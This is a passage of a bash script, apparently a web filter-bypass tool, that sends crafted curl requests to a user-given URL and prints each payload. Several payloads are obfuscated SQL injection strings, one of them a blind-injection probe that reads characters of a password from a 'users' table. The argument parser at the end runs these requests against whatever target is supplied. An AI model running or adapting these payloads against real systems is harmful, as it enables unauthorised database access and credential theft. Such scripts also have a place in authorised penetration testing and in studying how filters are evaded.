	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/1.e(ascii' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(substring(" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/1.e(substring(' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/1.e(ascii%%%%201.e(substring(1.e(select%%%%20password%%%%20from%%%%20users%%%%20limit%%%%201%%%%201.e%%%%2C1%%%%201.e)%%%%201.e%%%%2C1%%%%201.e%%%%2C1%%%%201.e)1.e)1.e)%%%%20%%%%3D%%%%2070%%%%20or'1'%%%%3D'2' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print
        echo "Finished\n"

}

function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
                                        try='all'
					shift
					;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [ "${try}" == 'all' ];then
			echo "Trying Bypasses...\n"
            bypass
            exit 0
	fi
}

prg $@
tput sgr0
